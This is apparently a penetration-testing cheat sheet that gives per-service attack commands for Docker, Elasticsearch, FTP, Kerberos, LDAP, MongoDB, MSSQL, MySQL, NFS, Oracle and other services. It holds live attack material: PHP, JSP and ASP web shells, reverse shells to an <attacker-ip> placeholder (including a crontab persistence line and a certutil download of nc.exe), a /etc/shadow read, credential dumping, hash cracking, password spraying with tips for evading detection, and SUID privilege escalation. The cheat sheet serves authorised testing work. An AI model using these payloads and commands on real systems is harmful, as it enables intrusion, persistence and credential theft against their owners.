<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1'"); ?>

nc -lvnp <port>

http://example.com/uploads/revshell.php

docs.title: MSFVenom PHP Reverse Shell
docs.text: msfvenom -p php/reverse_php LHOST=<attacker-ip> LPORT=<port> -f raw > shell.php

docs.title: Python Web Shell
docs.text:
import os
while True:
    cmd = input("Shell> ")
    os.system(cmd)

docs.title: JSP Web Shell
docs.text:
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

http://example.com/shell.jsp?cmd=whoami

docs.title: ASP Web Shell
docs.text:
<%
Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe /c " & Request.QueryString("cmd")
%>

docs.title: Finding & Removing Web Shells
docs.text:
find /var/www/ -type f -name "*.php" -exec grep -l "system(" {} +
grep -R "exec(" /var/www/
rm /var/www/html/shell.php

docs.title: Tools
docs.text:
• Weevely — Encrypted PHP web shell
  • China Chopper — Lightweight ASP/PHP shell
  • Revshells.com — Auto-generate reverse shell payloads
  • Burp Suite — Intercept and modify upload requests

docs.title: Information Gathering & Enumeration
docs.text: Solid enumeration wins engagements. The goal here isn't to run every tool — it's to build an accurate picture of what's exposed before touching anything.

docs.title: 1. Host Discovery
docs.text:
nmap -sn 10.10.10.0/24

Real-world

On internal engagements, ARP sweep with -PR -sn is more reliable than ICMP — many hosts block ping but can't hide from ARP on the same segment. If you're on an external assessment, skip discovery and go straight to port scanning your scoped IP list.

docs.title: 2. Port Scanning
docs.text:
The approach: kick off a quick Rustscan to get ports fast, then run a full nmap in the background while you start enumerating.

Quick scan: 

rustscan -a <target> --ulimit 5000 -- -sV -sC

Full TCP (background): 

nmap -p- -sV -sC --open -oA nmap_tcp <target>

UDP (background): 

sudo nmap -sU --top-ports 100 -oN nmap_udp.txt <target>

Real-world

Drop to -T2 and avoid -sC on the initial sweep against production systems — some NSE scripts are intrusive and have caused service disruptions on fragile hosts. Run scripts only against specific ports once you know what's there. Also save everything with -oA from the start; you'll need timestamps if the client asks what hit their systems and when.

Watch out

Confirm your target IPs are in scope before running anything. On real engagements, verify against the scope document — scanning out-of-scope hosts, even accidentally, is a significant problem.

docs.title: 3. Service Enumeration
docs.text:
Work through open ports methodically. Prioritise based on what's most likely to move the engagement forward:

Priority Services High SMB, WinRM, MSSQL, LDAP, RDP High SSH, FTP, HTTP/HTTPS Medium DNS, SMTP, SNMP, NFS, Rsync, Kerberos Medium Redis, Docker API, PostgreSQL, MySQL Low IMAP, POP3, VNC, Telnet, R-Services, TFTP

See the Service Analysis pages for per-protocol enumeration commands.

docs.title: Service Analysis
docs.text:
Per-protocol enumeration and attack commands. Each page covers the fastest path to a foothold for that service — start with the tip at the top, then work through the sections as needed.

Use the priority table from the Information Gathering overview to decide where to focus first.

docs.title: DNS (53)
docs.text:
Start here

Try zone transfer first: dig axfr @10.10.10.10 example.com. Internal DNS servers are commonly misconfigured and will hand you the full record set — subdomains, internal IPs, mail servers, everything.

docs.title: Banner Grabbing
docs.text:
nmap -sU -p 53 --script dns-nsid,dns-version 10.10.10.10
dig CH TXT version.bind @10.10.10.10

docs.title: Zone Transfer
docs.text:
dig axfr @10.10.10.10 example.com
host -t axfr example.com 10.10.10.10
nmap --script=dns-zone-transfer -p 53 10.10.10.10

docs.title: Subdomain Enumeration
docs.text:
# Passive — no direct contact with target
subfinder -d example.com
amass enum -passive -d example.com

# Active brute force
gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50
dnsenum --dnsserver 10.10.10.10 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt example.com

Real-world

Start with passive enumeration (subfinder, amass -passive) before touching the target's DNS server — passive techniques are invisible to the client's logging. Save active brute force for later or when passive results are thin.

docs.title: Reverse DNS Lookup
docs.text:
dig -x 10.10.10.10
nslookup 10.10.10.10

docs.title: Basic Record Queries
docs.text:
dig A example.com @10.10.10.10       # IPv4 address
dig MX example.com @10.10.10.10      # Mail servers
dig NS example.com @10.10.10.10      # Name servers
dig TXT example.com @10.10.10.10     # SPF, DKIM, verification records
dig ANY example.com @10.10.10.10     # All records

docs.title: Docker API (2375, 2376)
docs.text:
Start here

Check if the API is unauthenticated: curl http://10.10.10.10:2375/version. If it responds, you have full control of the Docker daemon — list containers, pull images, and mount the host filesystem into a new container for a complete host takeover.

Watch out

Port 2375 is unencrypted (no TLS). Port 2376 uses TLS but may still lack client cert verification. Try both.

docs.title: Enumeration
docs.text:
nmap -p 2375,2376 10.10.10.10
curl http://10.10.10.10:2375/version
curl http://10.10.10.10:2375/containers/json

docs.title: Interact via Docker CLI
docs.text:
Point your local Docker client at the remote daemon:

export DOCKER_HOST=tcp://10.10.10.10:2375
docker version
docker ps
docker images

docs.title: Host Filesystem Takeover
docs.text:
Mount the host root filesystem into a privileged container:

docker -H tcp://10.10.10.10:2375 run -it --rm \
  -v /:/mnt/host \
  alpine chroot /mnt/host sh

You now have root access to the host filesystem. From here:

# Add SSH key
echo '<your-public-key>' >> /root/.ssh/authorized_keys

# Read shadow
cat /etc/shadow

# Write a cron job
echo '* * * * * root bash -i >& /dev/tcp/<attacker-ip>/9001 0>&1' >> /etc/crontab

docs.title: Container Escape (Privileged Container)
docs.text:
If you're already inside a container running with --privileged:

# Check if privileged
cat /proc/self/status | grep CapEff

# Mount host disk
fdisk -l
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host

docs.title: List and Inspect Running Containers
docs.text:
docker -H tcp://10.10.10.10:2375 ps -a
docker -H tcp://10.10.10.10:2375 inspect <container-id>
docker -H tcp://10.10.10.10:2375 exec -it <container-id> sh

Real-world

Unauthenticated Docker API is an immediate critical — it's full host compromise in two commands. It shows up on dev/staging servers where engineers exposed the API for convenience and never locked it down. Always check 2375 on any Linux host running Docker. TLS on 2376 without client cert verification is equally exploitable.

docs.title: Elasticsearch (9200)
docs.text:
Start here

Test unauthenticated access first: curl http://10.10.10.10:9200/. If it returns a JSON banner with cluster info, you have full read access to every index. Elasticsearch prior to 8.x shipped with security disabled by default — internal deployments are almost always unauthenticated.

docs.title: Enumeration
docs.text:
nmap -p 9200 -sV --script http-enum 10.10.10.10
curl -s http://10.10.10.10:9200/                         # cluster banner, version
curl -s http://10.10.10.10:9200/_cluster/health          # cluster state
curl -s http://10.10.10.10:9200/_cat/indices?v           # list all indices
curl -s http://10.10.10.10:9200/_cat/nodes?v             # cluster nodes

docs.title: Dumping Data
docs.text:
Dump an entire index (up to 10k hits per request):

curl -s 'http://10.10.10.10:9200/<index>/_search?size=10000&pretty' > index_dump.json

Search for specific content across all indices:

curl -s 'http://10.10.10.10:9200/_search?q=password&size=100&pretty'
curl -s 'http://10.10.10.10:9200/_search?q=api_key&pretty'

For large indices, use the scroll API or elasticdump:

elasticdump --input=http://10.10.10.10:9200/<index> --output=index.json --type=data

docs.title: Authenticated Access
docs.text:
If basic auth is enabled:

curl -u elastic:<pass> http://10.10.10.10:9200/_cat/indices?v

Default/common credentials worth trying: elastic:changeme, elastic:elastic, kibana:changeme.

docs.title: Credential and Secret Hunting
docs.text:
Elasticsearch indices are a gold mine for passive credential discovery — logs, audit records, and forwarded syslog often contain cleartext secrets:

# Common fields to search
curl -s 'http://10.10.10.10:9200/_search?q=authorization&pretty'
curl -s 'http://10.10.10.10:9200/_search?q=bearer&pretty'
curl -s 'http://10.10.10.10:9200/_search?q=aws_access_key&pretty'
curl -s 'http://10.10.10.10:9200/_search?q=ssh-rsa&pretty'

docs.title: Metasploit Module
docs.text:
msfconsole
use auxiliary/scanner/elasticsearch/indices_enum
set RHOSTS 10.10.10.10
run

Real-world

Unauthenticated Elasticsearch shows up constantly on internal networks — it's usually the backend for Kibana, ELK stack logging, or application search. The indices themselves often contain more sensitive data than the production databases they're indexed from: full request bodies, error traces with session tokens, and historical log data that predates any security review. Always dump the indices list first and grep offline.

docs.title: FTP (21)
docs.text:
Start here

Always try anonymous login first. If you get in, check for write access — if the FTP root maps to a web directory, it's a direct file upload path.

docs.title: Enumeration
docs.text: nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-proftpd-backdoor,ftp-vsftpd-backdoor 10.10.10.10

docs.title: Anonymous Login
docs.text:
ftp 10.10.10.10
# Username: anonymous
# Password: anonymous

ftp> ls -la
ftp> ls -laR       # recursive listing

Mirror the entire directory without interacting manually: 

wget -m --no-passive ftp://anonymous@10.10.10.10

docs.title: Brute Force
docs.text:
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://10.10.10.10
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10

docs.title: File Transfer
docs.text:
ftp> get filename        # download
ftp> put filename        # upload
ftp> type binary         # switch to binary mode for non-text files

docs.title: Web Shell Upload
docs.text:
If the FTP root maps to a web-accessible directory (/var/www/html):

# Create shell locally
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload via FTP
ftp> put shell.php

Access at: http://10.10.10.10/shell.php?cmd=id

Watch out

Confirm the upload path is web-accessible before spending time on the shell. Upload a test file first and try to reach it over HTTP.

docs.title: Post-Exploitation
docs.text:
If you've compromised the host, check FTP config for stored credentials:

cat /etc/vsftpd.conf
grep ftp /etc/passwd

Real-world

FTP is rarely exposed externally on modern networks — when you do see it, it's usually a legacy system or an oversight. Treat it as higher priority than it looks; misconfigured FTP on an internal network often has write access to paths that matter.

docs.title: HTTP/HTTPS (80, 443)
docs.text:
Start here

Web services are their own discipline — too much content for a single service page. Full coverage lives in the Applications section.

docs.title: Quick Service Fingerprint
docs.text:
The first thirty seconds on any HTTP(S) port:

curl -skI https://10.10.10.10                           # headers (server, x-powered-by)
whatweb http://10.10.10.10                              # tech stack fingerprint
nmap -p 80,443 -sV --script http-enum,http-title,http-methods,http-headers 10.10.10.10

For TLS inspection and cert SAN extraction (SAN entries often reveal other vhosts):

openssl s_client -connect 10.10.10.10:443 -showcerts </dev/null 2>/dev/null \
  | openssl x509 -noout -text | grep -E 'Subject:|DNS:'

docs.title: Next Steps
docs.text:
Once you've fingerprinted the service, move into the Applications section:

  • Service Identification — deeper tech stack fingerprinting
  • Directory & Page Fuzzing — ffuf, feroxbuster, gobuster
  • Subdomain & Parameter Fuzzing — vhost and parameter discovery
  • Applications Overview — full attack methodology for web apps

Real-world

On external engagements, HTTP/HTTPS is almost always in scope and is usually the first (and sometimes only) foothold path. Fingerprint aggressively, check the cert SANs, run a quick nuclei templates pass, and move to manual Burp work against anything that looks non-standard.

docs.title: IMAP (143, 993)
docs.text:
Start here

Connect directly and check capabilities: nc 10.10.10.10 143, then send a1 CAPABILITY. Look for AUTH=PLAIN or AUTH=LOGIN on port 143 — if present, credentials are in cleartext. Worth a quick brute force with a default credentials list before going to rockyou.

docs.title: Enumeration
docs.text: nmap -p 143,993 --script imap-capabilities,imap-ntlm-info 10.10.10.10

docs.title: Manual Interaction
docs.text:
nc 10.10.10.10 143

# Once connected:
a1 CAPABILITY              # check supported auth methods
a1 LOGIN <user> <pass>     # authenticate
a1 LIST "" "*"             # list all mailboxes
a1 SELECT INBOX            # select a mailbox
a1 FETCH 1 BODY[]          # read first email
a1 FETCH 1:* FLAGS         # list all messages with flags

For IMAPS (port 993): 

openssl s_client -connect 10.10.10.10:993
openssl s_client -connect 10.10.10.10:143 -starttls imap

docs.title: Brute Force
docs.text:
hydra -L users.txt -P /usr/share/seclists/Passwords/Default-Credentials/default-userpasscombo.txt imap://10.10.10.10
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt imap://10.10.10.10

docs.title: NTLM Info (Windows environments)
docs.text:
nmap --script imap-ntlm-info -p 143,993 10.10.10.10

If NTLM authentication is in use, the response leaks internal hostname, domain, and OS version without any credentials.

docs.title: What to Look For
docs.text:
Once authenticated, search emails for:

  • Plaintext credentials or API keys
  • Password reset links for internal services
  • Internal hostnames, IP ranges, or infrastructure details
  • Attachments containing configuration files

Real-world

IMAP access on a compromised account is often more valuable than it looks. IT staff and developers frequently have credentials, VPN configs, or MFA backup codes sitting in their inbox. Always check sent items and drafts too — not just the inbox.

docs.title: IPMI (623)
docs.text:
Start here

Dump IPMI hashes unauthenticated using Metasploit — this works against IPMI 2.0 without credentials. Crack offline with hashcat mode 7300. Default creds are also worth trying immediately: admin:admin, ADMIN:ADMIN, root:calvin.

docs.title: Enumeration
docs.text: nmap -sU -p 623 --script ipmi-version 10.10.10.10

docs.title: Hash Dump (Unauthenticated)
docs.text:
msfconsole
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS 10.10.10.10
run

hashcat -m 7300 hashes.txt /usr/share/wordlists/rockyou.txt

docs.title: Default Credentials
docs.text: ipmitool -I lanplus -H 10.10.10.10 -U admin -P admin chassis status

docs.title: Cipher 0 Auth Bypass
docs.text:
IPMI 2.0 sometimes accepts authentication with Cipher 0, which allows any password.

ipmitool -I lanplus -C 0 -H 10.10.10.10 -U ADMIN -P anything user list

docs.title: Post-Auth Commands
docs.text:
ipmitool -I lanplus -H 10.10.10.10 -U <user> -P <pass> user list
ipmitool -I lanplus -H 10.10.10.10 -U <user> -P <pass> sensor
ipmitool -I lanplus -H 10.10.10.10 -U <user> -P <pass> sel list
ipmitool -I lanplus -H 10.10.10.10 -U <user> -P <pass> shell

Real-world

IPMI is common on bare-metal server hardware (Dell iDRAC, HP iLO, Supermicro BMC). The root:calvin default is specific to Dell iDRAC and still works on plenty of unpatched systems. Hash dumps are particularly valuable here — even a cracked IPMI hash often reuses credentials on the host OS or other management interfaces.

docs.title: IKE/ISAKMP (500, 4500)
docs.text:
Start here

Try Aggressive Mode first: ike-scan -A 10.10.10.10. If it responds, capture the PSK hash and crack offline with hashcat mode 5300/5400. Aggressive Mode + PSK is the main IKEv1 weakness — Main Mode doesn't expose the hash.

docs.title: Enumeration
docs.text: sudo nmap -sU -p 500,4500 --script ike-version 10.10.10.10

docs.title: ike-scan
docs.text:
ike-scan 10.10.10.10              # basic probe — is IKE responding?
ike-scan -M 10.10.10.10           # Main Mode — transform fingerprint
ike-scan -A 10.10.10.10           # Aggressive Mode probe

docs.title: PSK Hash Capture (Aggressive Mode)
docs.text:
ike-scan -A -P ike_psk_params.txt 10.10.10.10

If the gateway requires a group name: 

ike-scan -A --id=vpn -P ike_psk_params.txt 10.10.10.10

Crack offline: 

psk-crack -d /usr/share/wordlists/rockyou.txt ike_psk_params.txt

hashcat -m 5300 ike_psk_params.txt /usr/share/wordlists/rockyou.txt   # MD5
hashcat -m 5400 ike_psk_params.txt /usr/share/wordlists/rockyou.txt   # SHA1

docs.title: Group ID / XAUTH Enumeration
docs.text:
On legacy Cisco VPN stacks, valid group names return different responses — enumerate them, then brute XAUTH:

python3 ikeforce.py 10.10.10.10 -e -w groupnames.txt
python3 ikeforce.py 10.10.10.10 -b -i <group-id> -k <psk> -U users.txt -w passwords.txt

Real-world

IKE on external assessments usually means a VPN gateway. Aggressive Mode is disabled on modern configurations, but legacy Cisco ASA and older Juniper/Checkpoint devices still have it enabled. Check both 500/udp and 4500/udp — 4500 is NAT-T and shows up when traffic passes through NAT.

docs.title: Kerberos (88)
docs.text:
Start here

Port 88 open means you're looking at a domain controller. Start with username enumeration (no creds needed): kerbrute userenum -d example.com --dc 10.10.10.10 userlist.txt. Then immediately try ASREPRoasting — accounts without pre-auth required hand you crackable hashes.

docs.title: Enumeration
docs.text: nmap -p 88 --script krb5-enum-users 10.10.10.10

docs.title: Username Enumeration
docs.text: kerbrute userenum -d example.com --dc 10.10.10.10 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

docs.title: Password Spraying
docs.text:
Validate a single password against every user in one shot. Significantly stealthier than SMB spraying — Kerberos pre-auth failures log Event ID 4771 (not 4625 like SMB), and most SIEM rules are tuned to SMB lockouts first.

kerbrute passwordspray -d example.com --dc 10.10.10.10 users.txt 'Winter2024!'

To spray a small credential set without triggering lockouts, respect the domain lockout threshold (nxc smb 10.10.10.10 -u '' -p '' --pass-pol or query from LDAP) and keep attempts well under it.

Watch out

Even with low attempt counts, spraying generates enough 4771s to stand out if the blue team is watching pre-auth failures. On monitored environments, limit to one spray per password and pull user lists from existing LDAP/BloodHound data rather than kerbrute userenum, which itself generates 4768s per attempt.

docs.title: ASREPRoasting (No Credentials)
docs.text:
Accounts with pre-authentication disabled return a crackable AS-REP hash without any password.

GetNPUsers.py example.com/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat -outputfile asrep-hashes.txt

hashcat -m 18200 asrep-hashes.txt /usr/share/wordlists/rockyou.txt

docs.title: Kerberoasting (Requires Valid Credentials)
docs.text:
Request TGS tickets for accounts with SPNs — the encrypted tickets are crackable offline.

GetUserSPNs.py example.com/<user>:<pass> -dc-ip 10.10.10.10 -request -outputfile tgs-tickets.txt

hashcat -m 13100 tgs-tickets.txt /usr/share/wordlists/rockyou.txt

Real-world

ASREPRoasting is low-noise and requires zero credentials — run it as soon as you have a username list. Kerberoasting requires a foothold but is very effective against service accounts that haven't had their passwords rotated. Both attacks are noisy in event logs (4768/4769) but rarely alert on modern deployments unless specifically tuned.

docs.title: LDAP (389, 636)
docs.text:
Start here

Try anonymous bind first: ldapsearch -x -H ldap://10.10.10.10 -b "dc=example,dc=com". If it returns data you have unauthenticated enumeration of the entire directory — usernames, computers, group memberships, sometimes passwords in description fields.

docs.title: Enumeration
docs.text:
nmap -p 389,636 --script ldap-rootdse,ldap-search 10.10.10.10
nmap -n -sV --script "ldap* and not brute" 10.10.10.10

docs.title: Anonymous Bind
docs.text: ldapsearch -x -H ldap://10.10.10.10 -b "dc=example,dc=com"

docs.title: Authenticated Enumeration
docs.text:
# All users
ldapsearch -x -H ldap://10.10.10.10 -D 'user@example.com' -w '<pass>' \
  -b "dc=example,dc=com" "(objectClass=user)" sAMAccountName

# All computers
ldapsearch -x -H ldap://10.10.10.10 -D 'user@example.com' -w '<pass>' \
  -b "dc=example,dc=com" "(objectClass=computer)" cn

# Admin accounts (adminCount=1)
ldapsearch -x -H ldap://10.10.10.10 -D 'user@example.com' -w '<pass>' \
  -b "dc=example,dc=com" "(&(objectClass=user)(adminCount=1))" sAMAccountName

# Domain Admins group membership
ldapsearch -x -H ldap://10.10.10.10 -D 'user@example.com' -w '<pass>' \
  -b "dc=example,dc=com" "(memberOf=CN=Domain Admins,CN=Users,DC=example,DC=com)" sAMAccountName

# Passwords stored in description fields
ldapsearch -x -H ldap://10.10.10.10 -D 'user@example.com' -w '<pass>' \
  -b "dc=example,dc=com" "(description=*)" sAMAccountName description

docs.title: CrackMapExec
docs.text:
nxc ldap 10.10.10.10 -u <user> -p <pass> --users
nxc ldap 10.10.10.10 -u <user> -H <hash>

docs.title: NTLM Relay to LDAP
docs.text:
If you capture NTLMv2 hashes via LLMNR/NBT-NS poisoning, relay them to LDAP:

ntlmrelayx.py -t ldap://10.10.10.10 --dump

Real-world

Anonymous LDAP is still common on internal AD environments — it's rarely intentional, usually a misconfiguration from legacy requirements. Even with credentials, description fields are a reliable place to find passwords that sysadmins embedded years ago. Pull the full dump and grep it offline rather than running targeted queries.

docs.title: MongoDB (27017)
docs.text:
Start here

Connect without credentials: mongosh --host 10.10.10.10 (or legacy mongo --host 10.10.10.10). MongoDB before 3.6 bound to 0.0.0.0 by default with no authentication — unauthenticated access is still extremely common on internal deployments and exposed cloud instances.

docs.title: Enumeration
docs.text:
nmap -p 27017 -sV --script mongodb-info,mongodb-databases 10.10.10.10
mongosh --host 10.10.10.10 --eval "db.version()"

docs.title: Unauthenticated Access
docs.text:
mongosh --host 10.10.10.10

Once connected:

show dbs                              // list databases
use <database>
show collections                      // list collections (tables)
db.<collection>.find().pretty()       // dump a collection
db.<collection>.count()               // row count
db.getUsers()                         // list MongoDB users

docs.title: Authenticated Access
docs.text: mongosh --host 10.10.10.10 -u <user> -p <pass> --authenticationDatabase admin

docs.title: Dumping Databases
docs.text:
mongodump --host 10.10.10.10 --out ./mongo_dump
mongodump --host 10.10.10.10 -d <database> -c <collection> --out ./mongo_dump

Dump with authentication:

mongodump --host 10.10.10.10 -u <user> -p <pass> --authenticationDatabase admin --out ./mongo_dump

docs.title: Credential Hunting in Collections
docs.text:
Application databases frequently store hashed (sometimes cleartext) passwords, API tokens, and session data:

// search every collection in every database for password fields
db.getCollectionNames().forEach(function(c) {
  db[c].find({password: {$exists: true}}).forEach(printjson);
});

Dump everything and grep offline — faster than querying interactively:

mongodump --host 10.10.10.10 --out ./mongo_dump
grep -riE 'password|token|api[_-]?key|secret' ./mongo_dump

docs.title: Metasploit Modules
docs.text:
use auxiliary/scanner/mongodb/mongodb_login
set RHOSTS 10.10.10.10
run

Real-world

MongoDB was responsible for one of the largest classes of data exposure incidents in the 2017-2019 timeframe — tens of thousands of internet-facing instances without authentication. Modern defaults (3.6+) bind to localhost and require auth, but internal deployments, development environments, and lift-and-shift migrations frequently end up back at the old configuration. Dump everything and treat it like an Elasticsearch index — the value is usually in application data, not the database engine itself.

docs.title: MSSQL (1433)
docs.text:
Start here

Try SA with a blank password first: impacket-mssqlclient sa:@10.10.10.10. If you get in, run xp_cmdshell 'whoami' — it's often already enabled on unmanaged instances. If not, enable it with EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE.

Watch out

xp_cmdshell execution is logged. Use it to establish a shell quickly, then move to a less monitored method.

docs.title: Enumeration
docs.text: nmap -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-config 10.10.10.10

docs.title: Authentication
docs.text:
impacket-mssqlclient sa:@10.10.10.10
impacket-mssqlclient 'EXAMPLE/username':'password'@10.10.10.10 -windows-auth

docs.title: Brute Force
docs.text:
nxc mssql 10.10.10.10 -u users.txt -p passwords.txt
hydra -L users.txt -P passwords.txt mssql://10.10.10.10

docs.title: xp_cmdshell RCE
docs.text:
Enable if disabled: 

EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

Execute commands: 

EXEC xp_cmdshell 'whoami';

Reverse shell via certutil + nc: 

EXEC xp_cmdshell 'certutil -urlcache -f http://<attacker-ip>:8000/nc.exe C:\users\public\nc.exe';
EXEC xp_cmdshell 'C:\users\public\nc.exe <attacker-ip> 9001 -e cmd.exe';

docs.title: User Impersonation
docs.text:
Check who can be impersonated with the current login: 

SELECT DISTINCT b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

Switch to that login: 

EXECUTE AS LOGIN = 'sa';

docs.title: Credential Extraction
docs.text:
SELECT name, password_hash FROM sys.sql_logins;

hashcat -m 1731 hashes.txt /usr/share/wordlists/rockyou.txt

docs.title: Quick SQL Reference
docs.text:
SELECT name FROM master..sysdatabases;                              -- list databases
USE database_name; SELECT name FROM sysobjects WHERE xtype='U';    -- list tables
SELECT * FROM table_name;                                           -- dump table

Real-world

SA with a blank password is more common than it should be, especially on developer workstations and legacy installations. On internal assessments, also check for linked servers (SELECT * FROM sys.servers) — a low-privilege MSSQL instance linked to a high-privilege one is a common lateral movement path.

docs.title: MySQL (3306)
docs.text:
Start here

Try root with no password first: mysql -h 10.10.10.10 -u root (no -p flag). Many dev and staging instances have no root password set. If you get in and the user has FILE privilege, you can write a web shell directly to the web root.

docs.title: Enumeration
docs.text: nmap -p 3306 --script mysql-info,mysql-users,mysql-databases 10.10.10.10

docs.title: Authentication
docs.text:
mysql -h 10.10.10.10 -u root
mysql -h 10.10.10.10 -u root -p

If you get a TLS error, add --ssl-mode=DISABLED (MySQL 5.7+) or --skip-ssl (MariaDB).

docs.title: Brute Force
docs.text: hydra -L users.txt -P passwords.txt mysql://10.10.10.10

docs.title: Enumeration Queries
docs.text:
SELECT user, host FROM mysql.user;                          -- list users
SHOW GRANTS FOR 'root'@'localhost';                        -- check privileges
SHOW databases;
USE database_name; SHOW tables;
SELECT * FROM table_name;
SELECT host, user, authentication_string FROM mysql.user;  -- dump password hashes

docs.title: File Write (FILE Privilege)
docs.text:
If the MySQL user has FILE privilege, write a web shell:

SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';

Access at http://10.10.10.10/shell.php?cmd=id.

Dump a table to disk:

SELECT * INTO OUTFILE '/tmp/dump.txt' FROM table_name;

docs.title: Hash Cracking
docs.text:
hashcat -m 300 hashes.txt /usr/share/wordlists/rockyou.txt

Real-world

Remote MySQL exposure is almost always a misconfiguration — it's supposed to be localhost-only. When you find it, check FILE and EXECUTE privileges immediately. FILE gives you LFI/write; UDF exploitation via EXECUTE is a path to OS-level RCE but requires uploading a shared library.

docs.title: NFS (2049)
docs.text:
Start here

List exports without credentials: showmount -e 10.10.10.10. If shares are listed, mount and browse immediately. Look for no_root_squash in /etc/exports — if present, you can write a SUID binary as root from your attacker machine and execute it on the target for privilege escalation.

docs.title: Enumeration
docs.text:
sudo nmap -sV -p 111,2049 --script "nfs*" 10.10.10.10
showmount -e 10.10.10.10

docs.title: Mounting Shares
docs.text:
mkdir /mnt/nfs
sudo mount -t nfs 10.10.10.10:/share /mnt/nfs
ls -la /mnt/nfs

Look for: - /home/user/.ssh/id_rsa - Config files with credentials - Database dumps

docs.title: no_root_squash Privilege Escalation
docs.text:
Check the NFS config on the target:

cat /etc/exports

If a share has no_root_squash, create a SUID binary on your attacker machine and drop it into the mounted share:

# On attacker (as root)
cp /bin/bash /mnt/nfs/suid_bash
chmod +s /mnt/nfs/suid_bash

Then on the target:

/mnt/nfs/suid_bash -p
id

docs.title: SSH Key Injection
docs.text:
If a .ssh directory is accessible via the mount:

cat ~/.ssh/id_rsa.pub >> /mnt/nfs/home/user/.ssh/authorized_keys
ssh user@10.10.10.10

Real-world

NFS is common on internal networks for shared storage. no_root_squash is the high-value find — it's a direct path to root if the share maps to anything useful on the target. Even without it, mounted shares often contain SSH keys, config files, or database backups that move the engagement forward.

docs.title: Oracle TNS (1521)
docs.text:
Start here

Enumerate SIDs first — you can't connect without one: odat.py sidguesser -s 10.10.10.10. Once you have a SID, try default credentials: SCOTT:tiger, SYS:oracle, SYSTEM:manager. Connect with sqlplus <user>/<pass>@10.10.10.10:1521/<SID>.

docs.title: Enumeration
docs.text: nmap -p 1521 --script oracle-tns-version,oracle-sid-brute 10.10.10.10

docs.title: SID Enumeration
docs.text:
odat.py sidguesser -s 10.10.10.10
odat.py passwordguesser -s 10.10.10.10 -d <SID>

docs.title: Authentication
docs.text:
sqlplus <user>/<pass>@10.10.10.10:1521/<SID>

Default credentials to try:

SCOTT:tiger
SYS:oracle
SYSTEM:manager
HR:hr
DBSNMP:dbsnmp

docs.title: Post-Auth Enumeration
docs.text:
SELECT * FROM session_privs;                                      -- current privileges
SELECT username, account_status FROM dba_users WHERE account_status='OPEN';
SELECT * FROM dba_db_links;                                       -- linked databases
SELECT name, password FROM sys.user$;                             -- password hashes

docs.title: Hash Cracking
docs.text: hashcat -m 3100 hashes.txt /usr/share/wordlists/rockyou.txt

docs.title: OS Command Execution (DBA Required)
docs.text:
If the account has DBA privileges, schedule an OS command via DBMS_SCHEDULER:

BEGIN
  DBMS_SCHEDULER.CREATE_JOB(
    job_name   => 'cmd_job',
    job_type   => 'EXECUTABLE',
    job_action => '/bin/bash',
    number_of_arguments => 2,
    enabled    => FALSE);
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('cmd_job', 1, '-c');
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('cmd_job', 2, 'id > /tmp/out.txt');
  DBMS_SCHEDULER.ENABLE('cmd_job');
END;
/

Real-world

Oracle is common in enterprise environments and often runs with overprivileged service accounts. SID enumeration is the critical first step — without the right SID, you can't authenticate at all. SCOTT:tiger is ancient but still shows up on legacy installations that were never hardened.

docs.title: POP3 (110, 995)
docs.text:
Start here

Connect directly and authenticate: nc 10.10.10.10 110, then USER <username> / PASS <password>. Once in, LIST shows available messages and RETR 1 downloads the first one. Same credentials often work on IMAP, SMTP, and other internal services.

docs.title: Enumeration
docs.text: nmap -p 110,995 --script pop3-capabilities 10.10.10.10

docs.title: Manual Interaction
docs.text:
nc 10.10.10.10 110

USER admin
PASS password
LIST            # list messages
RETR 1          # read message 1
QUIT

For POP3S (port 995):

openssl s_client -connect 10.10.10.10:995
openssl s_client -connect 10.10.10.10:110 -starttls pop3

docs.title: Brute Force
docs.text:
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt pop3://10.10.10.10
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -s 995 pop3s://10.10.10.10

docs.title: Cleartext Auth Check
docs.text:
If port 110 is open without TLS, credentials are sent in cleartext. Check what auth methods are advertised:

openssl s_client -connect 10.10.10.10:110 -starttls pop3

Look for AUTH PLAIN or AUTH LOGIN in the capability response — if present on an unencrypted connection, credentials are interceptable.

Real-world

POP3 is low priority compared to IMAP — it downloads and deletes messages rather than leaving them server-side, so you get less visibility. That said, compromised POP3 credentials are worth testing across SMB, WinRM, and VPN immediately. IT staff email is often a goldmine for internal hostnames and credentials in forwarded threads.

docs.title: PostgreSQL (5432)
docs.text:
Start here

Try connecting as postgres with no password: psql -h 10.10.10.10 -U postgres. Many installs use postgres:postgres or trust authentication for local-equivalent connections. If you get in, check if COPY is available — it gives you file read and write on the host OS.

docs.title: Enumeration
docs.text: nmap -p 5432 --script pgsql-brute 10.10.10.10

docs.title: Authentication
docs.text:
psql -h 10.10.10.10 -U postgres
psql -h 10.10.10.10 -U postgres -W

Common credentials: postgres:postgres, postgres:admin, admin:admin

docs.title: Brute Force
docs.text: hydra -L users.txt -P passwords.txt postgres://10.10.10.10

docs.title: Enumeration Queries
docs.text:
\list                                   -- list databases
\c database_name                        -- connect to database
\dt                                     -- list tables
SELECT version();                       -- PostgreSQL version
